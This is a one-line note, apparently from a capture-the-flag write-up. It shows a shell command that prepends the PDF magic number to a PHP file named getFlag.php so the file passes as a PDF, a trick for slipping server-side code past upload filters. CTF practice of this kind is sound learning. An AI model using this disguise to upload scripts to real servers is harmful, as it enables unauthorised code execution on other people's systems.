Add the pdf magic number to the php file:
`{ echo "%PDF-"; cat getFlag.php; } > getFlag.pdf`
